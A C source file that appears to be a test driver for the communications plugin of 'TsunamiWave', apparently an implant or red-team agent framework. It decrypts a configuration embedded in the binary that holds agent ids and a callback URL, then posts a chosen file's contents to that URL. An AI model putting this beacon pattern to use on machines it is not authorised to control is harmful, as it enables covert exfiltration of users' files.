#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "EXE_InternetConnect.h"
#include "LIB_InternetConnect.h"

// Primary TsunamiWave Configuration
CHAR g_InternetConnect_szPackedConfiguration[CONFIGURATION_DEFAULT_BUFSIZE] = CONFIGURATION_DEFAULT_MAGIC_NUMBER;
CHAR g_InternetConnect_szPackedConfigurationPassword[] = CONFIGURATION_DEFAULT_PASSWORD;


DWORD wmain(INT argc, LPCWCHAR argv[], LPCWCHAR envp[])
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	LPBYTE	lpPackedConfigurationBuffer = NULL;
	DWORD	dwPackedConfigurationBufferSize = 0;
	LPBYTE	lpPackedConfigurationPasswordBuffer = NULL;
	DWORD	dwPackedConfigurationPasswordBufferSize = 0;
	CHAR*	szConfigurationJson = NULL;
	DWORD	dwConfigurationJsonSize = 0;

	cJSON*	lpJsonConfiguration = NULL;

	cJSON*	lpJsonBinaryId = NULL;
	cJSON*	lpJsonAgentId = NULL;
	cJSON*	lpJsonInternetConnectConfiguration = NULL;
	cJSON*	lpJsonInternetConnectConfigurationCallbackUrl = NULL;
	cJSON*	lpJsonInternetConnectConfigurationUserAgent = NULL;

	cJSON*	lpJsonInternetConnectInput = NULL;
	CHAR*	szInternetConnectInput = NULL;
	DWORD	dwInternetConnectInputSize = 0;

	cJSON*	lpJsonInternetConnectOutput = NULL;
	CHAR*	szInternetConnectOutput = NULL;
	DWORD	dwInternetConnectOutputSize = 0;

	cJSON*	lpJsonSendRequest = NULL;
	cJSON*	lpJsonSendRequestBuffer = NULL;
	//cJSON*	lpJsonSendResponse = NULL;
	cJSON*	lpJsonSendResponseBuffer = NULL;


	CHAR	szFilename[MAX_PATH];
	LPBYTE	lpMessageContents = NULL;
	DWORD	dwMessageContentsSize = 0;


	LPBYTE	lpRequestBuffer = NULL;
	DWORD	dwRequestBufferSize = 0;
	LPBYTE	lpResponseBuffer = NULL;
	DWORD	dwResponseBufferSize = 0;


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_InternetConnect wmain() start"));
			
			/********************************************************************************************
				Check Arguments
			********************************************************************************************/
			ZeroMemory(szFilename, MAX_PATH);
			if (2 == argc)
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("argv[1]: %s"), argv[1]);
				wcstombs(szFilename, argv[1], MAX_PATH);
			}
			else
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(DEBUG_ERROR, TEXT("argv[1]: <file_containing_message_to_send>"));
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szFilename: %S"), szFilename);


			/********************************************************************************************
				Read file into buffer
			********************************************************************************************/
			dwErrorCode = ReadFileIntoBuffer(
				szFilename,
				&lpMessageContents,
				&dwMessageContentsSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ReadFileIntoBuffer( %d, %p ) failed.(%08x)"),
					szFilename,
					&lpMessageContents,
					&dwMessageContentsSize,
					dwErrorCode);
				__leave;
			}


			/***************************************************************************
				Decode/decrypt the configuration JSON string from the binary
			***************************************************************************/
			lpPackedConfigurationBuffer = (LPBYTE)g_InternetConnect_szPackedConfiguration;
			dwPackedConfigurationBufferSize = (DWORD)strlen(g_InternetConnect_szPackedConfiguration);
			lpPackedConfigurationPasswordBuffer = (LPBYTE)g_InternetConnect_szPackedConfigurationPassword;
			dwPackedConfigurationPasswordBufferSize = (DWORD)strlen(g_InternetConnect_szPackedConfigurationPassword);

			DBGPRINT(DEBUG_INFO, TEXT("Get the configuration JSON from the binary storage"));
			dwErrorCode = GetConfigurationFromBinary(
				lpPackedConfigurationBuffer,
				dwPackedConfigurationBufferSize,
				lpPackedConfigurationPasswordBuffer,
				dwPackedConfigurationPasswordBufferSize,
				(LPBYTE*)&szConfigurationJson,
				&dwConfigurationJsonSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("DecodeDecryptDecompressBuffer( %p, %d, %p, %d, %p, %p ) failed.(%08x)"),
					lpPackedConfigurationBuffer,
					dwPackedConfigurationBufferSize,
					lpPackedConfigurationPasswordBuffer,
					dwPackedConfigurationPasswordBufferSize,
					(LPBYTE*)&szConfigurationJson,
					&dwConfigurationJsonSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwConfigurationJsonSize: %d"), dwConfigurationJsonSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szConfigurationJson:     %p"), szConfigurationJson);
			//printf("[%s(%d)] szConfigurationJson:\n%s\n", __FILE__, __LINE__, szConfigurationJson);

			// Parse the output string into a JSON object
			lpJsonConfiguration = cJSON_Parse(szConfigurationJson);
			if (NULL == lpJsonConfiguration)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonConfiguration = cJSON_Parse(%p) failed."),
					szConfigurationJson
				);
				__leave;
			}

			// Get the binary id
			lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_BINARY_ID);
			if (NULL == lpJsonBinaryId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_BINARY_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonBinaryId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonBinaryId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_BINARY_ID, lpJsonBinaryId->valueint);

			// Get the agent id
			lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_AGENT_ID);
			if (NULL == lpJsonAgentId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_AGENT_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonAgentId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonAgentId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_AGENT_ID, lpJsonAgentId->valueint);

			// -------------------------------------------------------------------------
			// Get any other configuration settings
			// -------------------------------------------------------------------------
			// Get the InternetConnect_Configuration from the g_InternetConnect_lpJsonInternetConnectConfig
			//lpJsonInternetConnectConfiguration = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, InternetConnect_Configuration);
			//if (NULL == lpJsonInternetConnectConfiguration)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
			//		lpJsonConfiguration,
			//		InternetConnect_Configuration
			//	);
			//	__leave;
			//}

			// Get the InternetConnect_Configuration_CallbackUrl from the InternetConnect_Configuration
			//lpJsonInternetConnectConfigurationCallbackUrl = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectConfiguration, InternetConnect_Configuration_CallbackUrl);
			lpJsonInternetConnectConfigurationCallbackUrl = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, InternetConnect_Configuration_CallbackUrl);
			if (NULL == lpJsonInternetConnectConfigurationCallbackUrl)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInternetConnectConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectConfiguration,
					lpJsonInternetConnectConfigurationCallbackUrl
				);
				__leave;
			}
			if (
				!cJSON_IsString(lpJsonInternetConnectConfigurationCallbackUrl) ||
				(NULL == lpJsonInternetConnectConfigurationCallbackUrl->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("cJSON_IsString(%p) failed."),
					lpJsonInternetConnectConfigurationCallbackUrl
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %S"), InternetConnect_Configuration_CallbackUrl, lpJsonInternetConnectConfigurationCallbackUrl->valuestring);

			// Get the InternetConnect_Configuration_UserAgent from the InternetConnect_Configuration
			//lpJsonInternetConnectConfigurationUserAgent = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectConfiguration, InternetConnect_Configuration_UserAgent);
			lpJsonInternetConnectConfigurationUserAgent = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, InternetConnect_Configuration_UserAgent);
			if (NULL == lpJsonInternetConnectConfigurationUserAgent)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInternetConnectConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectConfiguration,
					lpJsonInternetConnectConfigurationUserAgent
				);
				__leave;
			}
			if (
				!cJSON_IsString(lpJsonInternetConnectConfigurationUserAgent) ||
				(NULL == lpJsonInternetConnectConfigurationUserAgent->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("cJSON_IsString(%p) failed."),
					lpJsonInternetConnectConfigurationUserAgent
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %S"), InternetConnect_Configuration_UserAgent, lpJsonInternetConnectConfigurationUserAgent->valuestring);



			/***************************************************************************
				Initialize the InternetConnect plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the InternetConnect plugin"));
			dwErrorCode = InternetConnectInitialization(
				(LPBYTE)szConfigurationJson,
				dwConfigurationJsonSize,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("InternetConnectInitialization(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szConfigurationJson,
					dwConfigurationJsonSize,
					NULL,
					NULL,
					dwErrorCode
				);
				__leave;
			}


			/***************************************************************************
				Use the InternetConnectSendRequest
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Use the InternetConnectSendRequest"));

			// Create the input JSON object for the callback
			lpJsonInternetConnectInput = cJSON_CreateObject();
			if (NULL == lpJsonInternetConnectInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectInput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			// Create the InternetConnect_Send_Request JSON object
			lpJsonSendRequest = cJSON_AddObjectToObject(lpJsonInternetConnectInput, InternetConnect_Send_Request);
			if (NULL == lpJsonSendRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSendRequest = cJSON_AddObjectToObject(%p, %S) failed.\n"),
					lpJsonInternetConnectInput, InternetConnect_Send_Request
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSendRequest:    %p"), lpJsonSendRequest);

			// Create the InternetConnect_Send_Request_Buffer input JSON object
			lpJsonSendRequestBuffer = cJSON_CreateBytes(lpMessageContents, dwMessageContentsSize);
			if (NULL == lpJsonSendRequestBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSendRequestBuffer = cJSON_CreateBytes(%p,%d) failed."),
					lpMessageContents,
					dwMessageContentsSize
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonSendRequest, InternetConnect_Send_Request_Buffer, lpJsonSendRequestBuffer);

			// Create the string representation of the InternetConnect_Send_Request
			szInternetConnectInput = cJSON_Print(lpJsonInternetConnectInput);
			if (NULL == szInternetConnectInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("szInternetConnectInput = cJSON_Print(%p) failed."),
					lpJsonInternetConnectInput
				);
				__leave;
			}
			dwInternetConnectInputSize = (DWORD)strlen(szInternetConnectInput);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInternetConnectInputSize: %d"), dwInternetConnectInputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szInternetConnectInput:     %p"), szInternetConnectInput);
			//printf("szInternetConnectInput: \n%s\n", szInternetConnectInput);

			// Call the InternetConnectSendRequest passing in the JSON input object and receiving the JSON output object
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("InternetConnectSendRequest(%p, %d, %p, %p)"),
				(LPBYTE)szInternetConnectInput,
				dwInternetConnectInputSize,
				(LPBYTE*)&szInternetConnectOutput,
				&dwInternetConnectOutputSize
			);
			dwErrorCode = InternetConnectSendRequest(
				(LPBYTE)szInternetConnectInput,
				dwInternetConnectInputSize,
				(LPBYTE*)&szInternetConnectOutput,
				&dwInternetConnectOutputSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("InternetConnectSendRequest(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szInternetConnectInput,
					dwInternetConnectInputSize,
					(LPBYTE*)&szInternetConnectOutput,
					&dwInternetConnectOutputSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInternetConnectOutputSize: %d"), dwInternetConnectOutputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szInternetConnectOutput:     %p"), szInternetConnectOutput);
			//printf("szInternetConnectOutput:\n%s\n", szInternetConnectOutput);
			
			// Parse the output string into a JSON object
			lpJsonInternetConnectOutput = cJSON_Parse(szInternetConnectOutput);
			if (NULL == lpJsonInternetConnectOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectOutput = cJSON_Parse(%p) failed."),
					szInternetConnectOutput
				);
				__leave;
			}

			//// Get the response JSON object
			//lpJsonSendResponse = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectOutput, InternetConnect_Send_Response);
			//if (NULL == lpJsonSendResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSendResponse = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
			//		lpJsonInternetConnectOutput, InternetConnect_Send_Response
			//	);
			//	__leave;
			//}

			// Get and display the InternetConnect_Send_Response_Buffer
			lpJsonSendResponseBuffer = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectOutput, InternetConnect_Send_Response_Buffer);
			if (NULL == lpJsonSendResponseBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonSendResponseBuffer = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectOutput, InternetConnect_Send_Response_Buffer
				);
				__leave;
			}
			if (
				(!cJSON_IsBytes(lpJsonSendResponseBuffer)) ||
				(NULL == lpJsonSendResponseBuffer->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonSendResponseBuffer
				);
				__leave;
			}
			lpResponseBuffer = cJSON_GetBytesValue(lpJsonSendResponseBuffer, (int*)(&dwResponseBufferSize));
			if (NULL == lpResponseBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonSendResponseBuffer, &dwResponseBufferSize
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("  dwResponseBufferSize: %d"), dwResponseBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  lpResponseBuffer:     %p"), lpResponseBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  lpResponseBuffer:\n%S\n"), lpResponseBuffer);
			//printf("[%s(%d)] lpResponseBuffer:\n%s\n", __FILE__, __LINE__, lpResponseBuffer);

			

		} // end try-finally
		__finally
		{
			// free allocated buffer
			if (NULL != lpRequestBuffer)
			{
				FREE(lpRequestBuffer);
				lpRequestBuffer = NULL;
			}

			if (NULL != lpResponseBuffer)
			{
				cJSON_free(lpResponseBuffer);
				lpResponseBuffer = NULL;
			}

			// Delete input and output JSON objects
			if (NULL != lpJsonInternetConnectInput)
			{
				cJSON_Delete(lpJsonInternetConnectInput);
				lpJsonInternetConnectInput = NULL;
			}
			if (NULL != lpJsonInternetConnectOutput)
			{
				cJSON_Delete(lpJsonInternetConnectOutput);
				lpJsonInternetConnectOutput = NULL;
			}
			// Free input and output JSON strings
			if (NULL != szInternetConnectInput)
			{
				cJSON_free(szInternetConnectInput);
				szInternetConnectInput = NULL;
			}
			if (NULL != szInternetConnectOutput)
			{
				cJSON_free(szInternetConnectOutput);
				szInternetConnectOutput = NULL;
			}


			/***************************************************************************
				Finalize the InternetConnect plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the InternetConnect plugin"));
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("InternetConnectFinalization( %p, %d, %p, %p )"),
				NULL,
				NULL,
				NULL,
				NULL
			);
			dwTempErrorCode = InternetConnectFinalization(
				NULL,
				NULL,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("InternetConnectFinalization( %p, %d, %p, %p ) failed. (%08x)"),
					NULL,
					NULL,
					NULL,
					NULL,
					dwTempErrorCode
				);
				__leave;
			}
			

			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_InternetConnect wmain() end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
